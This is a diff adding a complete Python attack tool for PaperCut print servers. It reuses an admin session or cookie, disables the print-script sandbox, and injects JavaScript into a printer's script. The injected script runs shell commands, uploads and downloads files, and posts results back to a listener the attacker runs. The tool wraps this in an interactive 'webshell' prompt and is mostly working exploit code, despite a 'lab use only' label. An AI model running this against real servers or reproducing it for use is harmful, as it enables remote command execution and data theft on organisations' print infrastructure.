@@ -1,0 +1,406 @@
+#!/usr/bin/python3
+import argparse
+import base64
+import os
+import queue
+import socket
+import sys
+import threading
+
+import requests
+import urllib3
+from http.server import BaseHTTPRequestHandler, HTTPServer
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+
+# ----------------------------------------------------------------------------
+# Auth (reuse YOUR working login; cookie option is the most reliable shortcut)
+# ----------------------------------------------------------------------------
+def get_session_id(base_url, username=None, password=None, jsessionid=None):
+    s = requests.Session()
+    if jsessionid:
+        s.cookies.set('JSESSIONID', jsessionid)
+        print('[+] Reusing provided JSESSIONID cookie')
+        return s
+
+    # Version-specific: verify these field names against your login page.
+    r = s.get(f'{base_url}/app?service=page/Login', verify=False)
+    data = {
+        'service': 'direct/1/Login/$Form',
+        'sp': 'S0',
+        'Form0': '$TextField$0,$PasswordField$0,$Checkbox$0,$SubmitName',
+        '$TextField$0': username,
+        '$PasswordField$0': password,
+        '$Checkbox$0': 'on',
+        '$SubmitName': 'Login',
+    }
+    r = s.post(f'{base_url}/app', data=data,
+               headers={'Origin': f'{base_url}'}, verify=False)
+    if r.status_code == 200 and 'JSESSIONID' in s.cookies.get_dict():
+        print(f'[+] Authenticated as {username}')
+        return s
+    print('[-] Login failed. Use --cookie <JSESSIONID> from your browser session instead.')
+    return None
+
+
+# ----------------------------------------------------------------------------
+# Config toggles (unchanged from your script)
+# ----------------------------------------------------------------------------
+def set_setting(base_url, session, setting, enabled):
+    print(f'[*] Updating {setting} -> {enabled}')
+    headers = {'Origin': f'{base_url}'}
+    data = {
+        'service': 'direct/1/ConfigEditor/quickFindForm',
+        'sp': 'S0',
+        'Form0': '$TextField,doQuickFind,clear',
+        '$TextField': setting,
+        'doQuickFind': 'Go'
+    }
+    session.post(f'{base_url}/app', data=data, headers=headers, verify=False)
+
+    data = {
+        'service': 'direct/1/ConfigEditor/$Form',
+        'sp': 'S1',
+        'Form1': '$TextField$0,$Submit,$Submit$0',
+        '$TextField$0': enabled,
+        '$Submit': 'Update'
+    }
+    session.post(f'{base_url}/app', data=data, headers=headers, verify=False)
+
+
+# ----------------------------------------------------------------------------
+# Staging + injection (the printer-select dance from your original execute())
+# ----------------------------------------------------------------------------
+def stage_and_inject(base_url, session, script_body):
+    headers = {'Origin': f'{base_url}'}
+    session.get(f'{base_url}/app?service=page/PrinterList',
+                data={'service': 'page/PrinterList'}, headers=headers, verify=False)
+    session.get(f'{base_url}/app?service=direct/1/PrinterList/selectPrinter&sp=l1001',
+                data={'service': 'direct/1/PrinterList/selectPrinter', 'sp': 'l1001'},
+                headers=headers, verify=False)
+    session.get(f'{base_url}/app',
+                data={'service': 'direct/1/PrinterDetails/printerOptionsTab.tab', 'sp': '4'},
+                headers=headers, verify=False)
+
+    data = {
+        'service': 'direct/1/PrinterDetails/$PrinterDetailsScript.$Form',
+        'sp': 'S0',
+        'Form0': 'printerId,enablePrintScript,scriptBody,$Submit,$Submit$0,$Submit$1',
+        'printerId': 'l1001',
+        'enablePrintScript': 'on',
+        'scriptBody': script_body,
+        '$Submit$1': 'Apply',
+    }
+    r = session.post(f'{base_url}/app', data=data, headers=headers, verify=False)
+    return r
+
+
+# ----------------------------------------------------------------------------
+# Exfil listener (receives base64 payloads back from the target)
+# ----------------------------------------------------------------------------
+class ExfilHandler(BaseHTTPRequestHandler):
+    results = queue.Queue()
+
+    def do_POST(self):
+        length = int(self.headers.get('Content-Length', 0))
+        body = self.rfile.read(length)
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b'ok')
+        ExfilHandler.results.put(body)
+
+    def log_message(self, *args):
+        pass
+
+
+class ExfilServer(threading.Thread):
+    def __init__(self, port):
+        super().__init__(daemon=True)
+        self.port = port
+
+    def run(self):
+        HTTPServer(('0.0.0.0', self.port), ExfilHandler).serve_forever()
+
+
+def drain_results():
+    try:
+        while True:
+            ExfilHandler.results.get_nowait()
+    except queue.Empty:
+        pass
+
+
+def wait_result(timeout=30):
+    try:
+        return ExfilHandler.results.get(timeout=timeout)
+    except queue.Empty:
+        return None
+
+
+# ----------------------------------------------------------------------------
+# JS helpers
+# ----------------------------------------------------------------------------
+def js_str(s):
+    """Safe single-quoted JavaScript string literal."""
+    out = []
+    for ch in s:
+        if ch == '\\':
+            out.append('\\\\')
+        elif ch == "'":
+            out.append("\\'")
+        elif ch == '\r':
+            out.append('\\r')
+        elif ch == '\n':
+            out.append('\\n')
+        elif ch == '\t':
+            out.append('\\t')
+        else:
+            cp = ord(ch)
+            out.append(('\\u%04x' % cp) if (cp < 32 or cp == 127) else ch)
+    return "'" + ''.join(out) + "'"
+
+
+def local_ip():
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.connect(('8.8.8.8', 80))
+        ip = sock.getsockname()[0]
+        sock.close()
+        return ip
+    except OSError:
+        return '127.0.0.1'
+
+
+JS_CMD = r"""
+function printJobHook(inputs, actions) {}
+try {
+  var osName = java.lang.System.getProperty('os.name').toLowerCase();
+  var shell = (osName.indexOf('win') >= 0) ? 'cmd.exe' : '/bin/bash';
+  var flag  = (osName.indexOf('win') >= 0) ? '/c' : '-c';
+  var pb = new java.lang.ProcessBuilder();
+  pb.command(java.util.Arrays.asList(shell, flag, __CMD__));
+  pb.redirectErrorStream(true);
+  var p = pb.start();
+  var bos = new java.io.ByteArrayOutputStream();
+  var buf = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 8192);
+  var ins = p.getInputStream();
+  var n;
+  while ((n = ins.read(buf)) != -1) { bos.write(buf, 0, n); }
+  p.waitFor();
+  var b64 = java.util.Base64.getEncoder().encodeToString(bos.toByteArray());
+  _send(b64.getBytes('UTF-8'));
+} catch (e) {
+  _send(new java.lang.String('JS-ERROR: ' + e).getBytes('UTF-8'));
+}
+function _send(bytes) {
+  var url = new java.net.URL(__CB__ + '/exfil');
+  var c = url.openConnection();
+  c.setDoOutput(true);
+  c.setRequestMethod('POST');
+  c.setRequestProperty('Content-Type', 'application/octet-stream');
+  c.setRequestProperty('Content-Length', '' + bytes.length);
+  var o = c.getOutputStream();
+  o.write(bytes);
+  o.close();
+  c.getInputStream().close();
+}
+"""
+
+JS_UPLOAD = r"""
+function printJobHook(inputs, actions) {}
+try {
+  var data = java.util.Base64.getDecoder().decode(__B64__);
+  java.nio.file.Files.write(java.nio.file.Paths.get(__PATH__), data);
+  _send('UPLOAD_OK ' + data.length);
+} catch (e) {
+  _send('UPLOAD_ERR ' + e);
+}
+function _send(msg) {
+  var bytes = new java.lang.String(msg).getBytes('UTF-8');
+  var url = new java.net.URL(__CB__ + '/exfil');
+  var c = url.openConnection();
+  c.setDoOutput(true);
+  c.setRequestMethod('POST');
+  c.setRequestProperty('Content-Length', '' + bytes.length);
+  var o = c.getOutputStream();
+  o.write(bytes);
+  o.close();
+  c.getInputStream().close();
+}
+"""
+
+JS_DOWNLOAD = r"""
+function printJobHook(inputs, actions) {}
+try {
+  var raw = java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(__PATH__));
+  var b64 = java.util.Base64.getEncoder().encodeToString(raw);
+  _send(b64);
+} catch (e) {
+  _send('DOWNLOAD_ERR ' + e);
+}
+function _send(msg) {
+  var bytes = new java.lang.String(msg).getBytes('UTF-8');
+  var url = new java.net.URL(__CB__ + '/exfil');
+  var c = url.openConnection();
+  c.setDoOutput(true);
+  c.setRequestMethod('POST');
+  c.setRequestProperty('Content-Length', '' + bytes.length);
+  var o = c.getOutputStream();
+  o.write(bytes);
+  o.close();
+  c.getInputStream().close();
+}
+"""
+
+
+# ----------------------------------------------------------------------------
+# Operations
+# ----------------------------------------------------------------------------
+def run_command(base_url, session, callback, command):
+    script = (JS_CMD
+              .replace('__CMD__', js_str(command))
+              .replace('__CB__', js_str(callback)))
+    drain_results()
+    r = stage_and_inject(base_url, session, script)
+    if not (r.status_code == 200 and 'Saved successfully' in r.text):
+        print('[-] Script apply reported failure (it may still have executed)')
+
+    res = wait_result()
+    if res is None:
+        print('[-] No callback: command likely exceeded the ~5s script timeout, '
+              'or the callback URL is not reachable from the target.')
+        return
+    print(res.decode('utf-8', errors='replace'))
+
+
+def upload_file(base_url, session, callback, local, remote):
+    if not os.path.exists(local):
+        print(f'[-] Local file not found: {local}')
+        return
+    with open(local, 'rb') as f:
+        b64 = base64.b64encode(f.read()).decode('ascii')
+    if len(b64) > 1_500_000:
+        print(f'[!] {local} is large ({len(b64)} b64 chars). '
+              'Keep uploads small; the Rhino engine times out after ~5s.')
+
+    script = (JS_UPLOAD
+              .replace('__B64__', js_str(b64))
+              .replace('__PATH__', js_str(remote))
+              .replace('__CB__', js_str(callback)))
+    drain_results()
+    r = stage_and_inject(base_url, session, script)
+    if not (r.status_code == 200 and 'Saved successfully' in r.text):
+        print('[-] Script apply reported failure')
+    res = wait_result()
+    print(res.decode('utf-8', errors='replace') if res else '[-] No callback received')
+
+
+def download_file(base_url, session, callback, remote, local):
+    script = (JS_DOWNLOAD
+              .replace('__PATH__', js_str(remote))
+              .replace('__CB__', js_str(callback)))
+    drain_results()
+    r = stage_and_inject(base_url, session, script)
+    if not (r.status_code == 200 and 'Saved successfully' in r.text):
+        print('[-] Script apply reported failure')
+    res = wait_result()
+    if res is None:
+        print('[-] No callback received')
+        return
+    text = res.decode('utf-8', errors='replace')
+    if text.startswith('DOWNLOAD_ERR'):
+        print(f'[-] {text}')
+        return
+    try:
+        data = base64.b64decode(res)
+    except Exception:
+        print(f'[-] Unexpected response: {text[:200]}')
+        return
+    with open(local, 'wb') as f:
+        f.write(data)
+    print(f'[+] Download OK: {len(data)} bytes -> {local}')
+
+
+def cleanup(base_url, session):
+    print('[*] Cleanup: restoring harmless script and re-enabling sandbox')
+    try:
+        stage_and_inject(base_url, session, 'function printJobHook(inputs, actions) {}\r\n')
+        set_setting(base_url, session, 'print-and-device.script.enabled', 'N')
+        set_setting(base_url, session, 'print.script.sandboxed', 'Y')
+    except Exception as e:
+        print(f'[!] Cleanup incomplete: {e}')
+
+
+# ----------------------------------------------------------------------------
+# Entry point
+# ----------------------------------------------------------------------------
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser(
+        description='PaperCut authenticated-admin print-script shell (lab use only)')
+    parser.add_argument('-u', '--url', required=True, help='PaperCut base URL')
+    parser.add_argument('-U', '--username', help='Admin username (login form)')
+    parser.add_argument('-P', '--password', help='Admin password (login form)')
+    parser.add_argument('--cookie', help='JSESSIONID value to reuse an existing session')
+    parser.add_argument('--callback', help='URL reachable from the target, e.g. http://10.0.40.83:8081')
+    parser.add_argument('--lport', type=int, default=8081, help='Port to listen on for callbacks')
+    parser.add_argument('-c', '--command', help='Run one command and exit (non-interactive)')
+    args = parser.parse_args()
+
+    sess = get_session_id(args.url, args.username, args.password, args.cookie)
+    if not sess:
+        sys.exit(1)
+
+    callback = args.callback or f'http://{local_ip()}:{args.lport}'
+    ExfilServer(args.lport).start()
+
+    try:
+        set_setting(args.url, sess, 'print-and-device.script.enabled', 'Y')
+        set_setting(args.url, sess, 'print.script.sandboxed', 'N')
+
+        if args.command:
+            run_command(args.url, sess, callback, args.command)
+        else:
+            print(f'[*] Callback URL: {callback}')
+            print('    Commands:  exec <cmd> | upload <local> <remote> | '
+                  'download <remote> <local> | help | exit')
+            while True:
+                try:
+                    line = input('webshell> ').strip()
+                except (EOFError, KeyboardInterrupt):
+                    print()
+                    break
+                if not line:
+                    continue
+                parts = line.split(None, 1)
+                op = parts[0].lower()
+                arg = parts[1] if len(parts) > 1 else ''
+
+                if op in ('exit', 'quit'):
+                    break
+                elif op in ('exec', '!'):
+                    if arg:
+                        run_command(args.url, sess, callback, arg)
+                    else:
+                        print('usage: exec <command>')
+                elif op == 'upload':
+                    toks = arg.split()
+                    if len(toks) < 2:
+                        print('usage: upload <local> <remote>')
+                    else:
+                        upload_file(args.url, sess, callback, toks[0], toks[1])
+                elif op == 'download':
+                    toks = arg.split()
+                    if len(toks) < 2:
+                        print('usage: download <remote> <local>')
+                    else:
+                        download_file(args.url, sess, callback, toks[0], toks[1])
+                elif op == 'help':
+                    print('exec <cmd>               run a shell command, print output')
+                    print('upload <local> <remote>  write a local file to the target')
+                    print('download <remote> <local> read a target file to local disk')
+                    print('exit                     clean up and quit')
+                else:
+                    print('unknown command (type help)')
+    finally:
+        cleanup(args.url, sess)
